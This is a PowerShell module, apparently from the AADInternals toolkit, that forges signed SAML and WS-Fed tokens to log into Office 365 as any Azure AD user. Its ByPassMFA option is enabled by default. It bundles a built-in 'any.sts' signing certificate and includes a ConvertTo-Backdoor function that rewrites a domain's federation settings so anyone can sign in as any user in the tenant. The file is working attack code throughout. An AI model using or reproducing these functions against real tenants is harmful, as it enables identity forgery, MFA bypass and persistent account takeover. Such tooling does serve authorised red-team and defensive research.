﻿# any.sts public key
$any_sts="MIIDcTCCAligAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJmaTESMBAGA1UECAwJUGlya2FubWFhMREwDwYDVQQKDAhHZXJlbmlvczEcMBoGA1UEAwwTaGFjay5vMzY1ZG9tYWluLm9yZzAeFw0xODAyMjExMzEyNDVaFw0yODAyMTkxMzEyNDVaMFIxCzAJBgNVBAYTAmZpMRIwEAYDVQQIDAlQaXJrYW5tYWExETAPBgNVBAoMCEdlcmVuaW9zMRwwGgYDVQQDDBNoYWNrLm8zNjVkb21haW4ub3JnMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQIApH73Hcv30uHHve6Zd3E/aEeFgQRMZD/CJUQC2DfSk0mDX8X75MIo7gP+62ZTUsOxhSDdOOVYshK8Kyk9VZvo21A5hDcCudXxc/eifCdwGLalCaOQt8pdMlYJgsBDcieMNToCx2pXp1PvkJdKc2JiXQCIAolJySbNXGJbBG1Oh4tty7lEXUqHpHgqiIJCb64q64BIQpZr/WQG0QgtH/gwWYz7b/psNA4xVi8RJnRUl7I62+j0WVSTih2j3kK20j5OIW9Rk+5XoHJ5npOBM84pYJ6yxMz1sOdSqOccAjSVHWFKdM437PxAPeiXAXoBKczGZ72Q8ocz2YSLGKcSMnYCrhECAwEAAaNQME4wHQYDVR0OBBYEFNu32o5XSIQ0lvwB+d2cnTlrtk2PMB8GA1UdIwQYMBaAFNu32o5XSIQ0lvwB+d2cnTlrtk2PMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQENBQADggECAHokwTra0dlyG5jj08TiHlx1pJFnqlejjpFXaItuk2jEBfO/fv1AJaETSR5vupFfDHA337oPiqWugxai1TIvJGKhZImNloMj8lyeZk/9/5Pt2X4N8r1JpAQzt+Ez3z7aNrAFxRjJ0Y+rDDcSItZ5vaXJ5PqBvR7icjIBaXrHVFUC6OZ2RkebbpajbIdt6U/P7ovg7L1J6LAzL/asATZzM3Mjn+9rsC9xLbJwuEabLU+BxySsNo8TULYi9O2MSJ9FvddE6n3OPqrmldldCrb6OugK/pzCwjTnVgRtrHNJc+zKavbiu0Yfp8uYhvCCWAakdQ8g6ZNJ1TGSaYNIrpTIhXIJ"

# Creates a SAML token
function New-SAMLToken
{
<#
    .SYNOPSIS
    Creates a SAML token

    .DESCRIPTION
    Creates a valid SAML token for given user

    .Parameter UserName
    User Principal Name (UPN) of the user. Not used by AAD Identity Federation so can be any email address.

    .Parameter ImmutableID
    Immutable ID of the user. For synced users, this is user's AD object GUID encoded in B64.
    For non-synced users this must be set manually, can be any unique string within the tenant.
    User doesn't have to federated user.

    .Parameter Issuer
    Issuer identification of Identity Provider (IdP). Usually this is a FQDN of the ADFS server, but can be any
    unique string within Azure AD. Must match federation information of validated domain in the tenant.

    .Parameter ByPassMFA
    Whether to add an attribute to by-pass MFA. Default is $True.

    .Parameter Certificate
    A X509 certificate used to sign the SAML token. Must match federation information of validated domain in the tenant.

    .Parameter PfxFileName
    The full path to .pfx file from where to load the certificate

    .Parameter PfxPassword
    The password of the .pfx file
    
    .Example
    PS C:\>New-AADIntSAMLToken -ImmutableId "Ah2J42BsPUOBoUcsCYn7vA==" -Issuer "http://mysts.company.com/adfs/ls" -PfxFileName "MyCert.pfx" -PfxPassword -Password "mypassword"

    .Example
    PS C:\>$cert=Get-AADIntCertificate -FileName "MyCert.pfx" -Password "mypassword"
    PS C:\>New-AADIntSAMLToken -ImmutableId "Ah2J42BsPUOBoUcsCYn7vA==" -Issuer "http://mysts.company.com/adfs/ls" -Certificate $cert

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]$UserName="joulupukki@korvatunturi.fi", # Not used in AAD identity federation, defaults to Santa Claus ;)
        [Parameter(Mandatory=$True)]
        [String]$ImmutableID,
        [Parameter(Mandatory=$True)]
        [String]$Issuer,
        [Parameter(Mandatory=$False)]
        [bool]$ByPassMFA=$true,

        [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
        [switch]$UseBuiltInCertificate,

        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,

        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
        [string]$PfxFileName,
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
        [string]$PfxPassword


    )
    Process
    {
        # Do we use built-in certificate (any.sts)
        if($UseBuiltInCertificate)
        {
            $Certificate = Get-Certificate -FileName "$PSScriptRoot\any_sts.pfx" -Password ""
        }
        elseif($Certificate -eq $null) # Load the ceftificate
        {
            $Certificate = Get-Certificate -FileName $PfxFileName -Password $PfxPassword
        }

        # Import the assemblies
        Add-Type -AssemblyName 'System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
        
        # Create a new SAML assertion
        $assertion = New-Object System.IdentityModel.Tokens.SamlAssertion
        
        # Set id, time, and issuer
        $assertion.AssertionId = "_$((New-Guid).ToString())"
        $assertion.IssueInstant = (get-date).ToUniversalTime()
        $assertion.Issuer = $Issuer

        # Create audience and SAML conditions objects
        $audienceCondition = New-Object System.IdentityModel.Tokens.SamlAudienceRestrictionCondition -ArgumentList @(,[System.Uri[]]@(New-Object System.Uri("urn:federation:MicrosoftOnline")))
        $SAMLConditionList = @($audienceCondition)
        $SAMLConditions = New-Object System.IdentityModel.Tokens.SamlConditions((Get-Date), (Get-Date).AddHours(1), [System.IdentityModel.Tokens.SamlAudienceRestrictionCondition[]]$SAMLConditionList)
        $assertion.Conditions=$SAMLConditions
        
        # Create subject and attribute statements
        $subject = New-Object System.IdentityModel.Tokens.SamlSubject
        $subject.ConfirmationMethods.Add("urn:oasis:names:tc:SAML:1.0:cm:bearer")

        $statement = New-Object System.IdentityModel.Tokens.SamlAttributeStatement
        # Note! Azure AD identity federation doesn't care about UPN at all, it can be anything.
        $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.xmlsoap.org/claims","UPN",[string[]]@($UserName))))
        $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/LiveID/Federation/2008/05","ImmutableID",[string[]]@($ImmutableID))))
        if($ByPassMFA)
        {
            $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/claims","authnmethodsreferences",[string[]]@("http://schemas.microsoft.com/claims/multipleauthn"))))
        }
        $statement.SamlSubject = $subject

        $assertion.Statements.Add($statement)

        # Create authentication statement
        $assertion.Statements.Add((New-Object System.IdentityModel.Tokens.SamlAuthenticationStatement($subject,"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport", (Get-Date), $null, $null, $null)))

        # Sign the assertion
        $ski = New-Object System.IdentityModel.Tokens.SecurityKeyIdentifier((New-Object System.IdentityModel.Tokens.X509RawDataKeyIdentifierClause($Certificate))) 
        $assertion.SigningCredentials = New-Object System.IdentityModel.Tokens.SigningCredentials((New-Object System.IdentityModel.Tokens.X509AsymmetricSecurityKey($Certificate)), [System.IdentityModel.Tokens.SecurityAlgorithms]::RsaSha1Signature, [System.IdentityModel.Tokens.SecurityAlgorithms]::Sha1Digest, $ski )

        # Create a SAML token
        $token = New-Object System.IdentityModel.Tokens.SamlSecurityToken($assertion)

        # Convert to XML
        $handler = New-Object System.IdentityModel.Tokens.SamlSecurityTokenHandler
        $writer = New-Object System.IO.StringWriter
        $handler.WriteToken((New-Object System.Xml.XmlTextWriter($writer)), $token)
        $strToken=$writer.ToString()

        return $strToken
     }
}

# Create WSFed response
function New-WSFedResponse
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$SAMLToken
    )
    Process
    {

        # Create the Request Security Token Response
        $response=@"
        <t:RequestSecurityTokenResponse xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust">
            <t:Lifetime>
                <wsu:Created xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$((Get-Date).toString("o"))</wsu:Created>
                <wsu:Expires xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$((Get-Date).AddHours(1).toString("o"))</wsu:Expires>
            </t:Lifetime>
            <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
                <wsa:EndpointReference xmlns:wsa="http://www.w3.org/2005/08/addressing">
                    <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                </wsa:EndpointReference>
            </wsp:AppliesTo>
            <t:RequestedSecurityToken>
                $SAMLToken
            </t:RequestedSecurityToken>
            <t:TokenType>urn:oasis:names:tc:SAML:1.0:assertion</t:TokenType>
            <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
            <t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
        </t:RequestSecurityTokenResponse>
"@

        return $response
    }
}

# Load .pfx certificate
function Get-Certificate
{
<#
    .SYNOPSIS
    Loads X509 certificate from the given .pfx file

    .DESCRIPTION
    Loads X509 certificate from the given .pfx file

    .Parameter FileName
    The full path to .pfx file from where to load the certificate

    .Parameter Password
    The password of the .pfx file
    
    .Example
    PS C:\>Get-AADIntCertificate -FileName "MyCert.pfx" -Password -Password "mypassword"

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$FileName,
        [Parameter(Mandatory=$False)]
        [String]$Password=""
    )
    Process
    {

        $Certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($FileName, $Password, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet)
        return $Certificate
    }
}


# Opens a web browser and logins as the given user
function Open-Office365Portal
{
<#
    .SYNOPSIS
    Opens a web browser and logins to Office 365 as the given user

    .DESCRIPTION
    Creates an identity federation token and opens a login form in Internet Explorer.

    .Parameter UserName
    User Principal Name (UPN) of the user. Not used by AAD Identity Federation so can be any email address.

    .Parameter ImmutableID
    Immutable ID of the user. For synced users, this is user's AD object GUID encoded in B64.
    For non-synced users this must be set manually, can be any unique string within the tenant.
    User doesn't have to federated user.

    .Parameter Issuer
    Issuer identification of Identity Provider (IdP). Usually this is a FQDN of the ADFS server, but can be any
    unique string within Azure AD. Must match federation information of validated domain in the tenant.

    .Parameter ByPassMFA
    Whether to add an attribute to by-pass MFA. Default is $True.

    .Parameter UseAnySTS
    Uses internal any.sts certificate

    .Parameter Certificate
    A X509 certificate used to sign the SAML token. Must match federation information of validated domain in the tenant.

    .Parameter PfxFileName
    The full path to .pfx file from where to load the certificate

    .Parameter PfxPassword
    The password of the .pfx file

    .Parameter UseBuiltInCertificate
    Use the built-in any.sts certificate.
    
    .Example
    PS C:\>Open-AADIntOffice365Portal -ImmutableId "Ah2J42BsPUOBoUcsCYn7vA==" -Issuer "http://mysts.company.com/adfs/ls" -PfxFileName "MyCert.pfx" -PfxPassword -Password "mypassword"

    .Example
    PS C:\>$cert=Get-AADIntCertificate -FileName "MyCert.pfx" -Password "mypassword"
    PS C:\>Open-AADIntOffice365Portal -ImmutableId "Ah2J42BsPUOBoUcsCYn7vA==" -Issuer "http://mysts.company.com/adfs/ls" -Certificate $cert

    .Example
    PS C:\>$id=Get-AADIntImmutableID -ADUser (Get-ADUser firstname.lastname)
    PS C:\>Open-AADIntOffice365Portal -ImmutableId $id -Issuer "http://mysts.company.com/adfs/ls" -UseBuiltInCertificate
#>
    [cmdletbinding()]
    Param(
    
        [Parameter(Mandatory=$False)]
        [String]$UserName="joulupukki@korvatunturi.fi", # Not used in AAD identity federation, defaults to Santa Claus ;)
        [Parameter(Mandatory=$True)]
        [String]$ImmutableID,
        [Parameter(Mandatory=$True)]
        [String]$Issuer,
        [Parameter(Mandatory=$False)]
        [bool]$ByPassMFA=$true,
        [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
        [switch]$UseBuiltInCertificate,
        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
        [string]$PfxFileName,
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
        [string]$PfxPassword

    )
    Process
    {
        # Do we use built-in certificate (any.sts)
        if($UseBuiltInCertificate)
        {
            $Certificate = Get-Certificate -FileName "$PSScriptRoot\any_sts.pfx" -Password ""
        }
        elseif($Certificate -eq $null) # Load the ceftificate
        {
            $Certificate = Get-Certificate -FileName $PfxFileName -Password $PfxPassword
        }

        # Create SAML token and WSFED response
        $token=New-SAMLToken -UserName $UserName -ImmutableID $ImmutableId -Issuer $Issuer -Certificate $Certificate
        $wsfed=New-WSFedResponse -SAMLToken $token

        # Create a login form
        $form=@"
        <html>
            <head><title>AADInternals Office 365 login form</title></head>
            <body onload="document.forms['login'].submit()">
                <form action="https://login.microsoftonline.com/login.srf" method="post" name="login">
                    <input name="wa" type="hidden" value="wsignin1.0" />
                    <input name="wctx" type="hidden" value="" />
                    <input name="wresult" type="hidden" value="$([System.Net.WebUtility]::HtmlEncode($wsfed))">
                    To login automatically, the javascript needs to be enabled.. So just click the button! <br>
                    <button type="submit">Login to Office 365</button>
            </body>
        </html>
"@
        # Create a temporary file
        # TODO: remove the tmp file
        $tmp = New-TemporaryFile
        Rename-Item -Path $tmp.FullName -NewName ($tmp.Name+".html")
        $html = ($tmp.FullName+".html")

        # Write the form to the file
        $form | Out-File $html
        
        # Start IE in private mode  
        Start-Process iexplore.exe -ArgumentList "-private $("file:///$html")"
    }
}


# Gets immutable id from AD user
function Get-ImmutableID
{
<#
    .SYNOPSIS
    Gets Immutable ID using user's AD object

    .DESCRIPTION
    Gets Immutable ID using user's AD object

    .Parameter ADUser
    Users AD object.

    .Example
    PS C:\>$user=Get-ADUser "myuser"
    PS C:\>$immutableId=Get-AADIntImmutableID

#>
    [cmdletbinding()]
    Param(
    
        [Parameter(Mandatory=$True)]
        $ADUser
        
    )
    Process
    {
        
        if($ADUser.GetType().ToString() -ne "Microsoft.ActiveDirectory.Management.ADUser")
        {
            Write-Error "ADUser is wrong type. Must be Microsoft.ActiveDirectory.Management.ADUser"
            return
        }

        # Convert GUID to Base64
        $guid=$ADUser.ObjectGUID.ToString()
        $ImmutableId=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getBytes($guid))

        return $ImmutableId
    }
}

# Creates a backdoor to Azure AD
function ConvertTo-Backdoor
{
<#
    .SYNOPSIS
    Converts a domain to a backdoor to Azure AD tenant.

    .DESCRIPTION
    Opens a backdoor to Azure AD tenant by altering the given domains authentication settings.
    Allows logging in as any user of the tenant.

    The certificate will be configured to be any.sts and issuer http://sts.0nmicrosoft.com/<tenant id>

    .Parameter AccessToken
    Access Token

    .Parameter DomainName
    The domain to be used as a backdoor
    
    .Example
    PS C:\>ConvertTo-AADIntBackdoor -DomainName backdoor.myo365.site

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]$AccessToken,
        [Parameter(Mandatory=$True)]
        [String]$DomainName
    )
    Process
    {
        # Get from cache if not provided
        $AccessToken = Get-AccessTokenFromCache($AccessToken)

        # Set some variables
        $tenant_id = Get-TenantId -AccessToken $AccessToken

        $LogOnOffUri ="https://sts.0nmicrosoft.com/$tenant_id"
        $IssuerUri = "http://sts.0nmicrosoft.com/$tenant_id"

        $input = read-host "Are you sure to create backdoor with $DomainName`? Type YES to continue or CTRL+C to abort"
        switch ($input) `
        {
            "yes" {
                Set-DomainAuthentication -Authentication Federated -AccessToken $AccessToken -DomainName $DomainName -LogOffUri $LogOnOffUri -PassiveLogOnUri $LogOnOffUri -IssuerUri $IssuerUri -SigningCertificate $any_sts
                Write-Host "Backdoor created. Domain: $DomainName, issuer=$IssuerUri" -ForegroundColor DarkBlue -BackgroundColor White
            }

            default {
                write-host "Aborted" -ForegroundColor Red
            }
        }

    }
}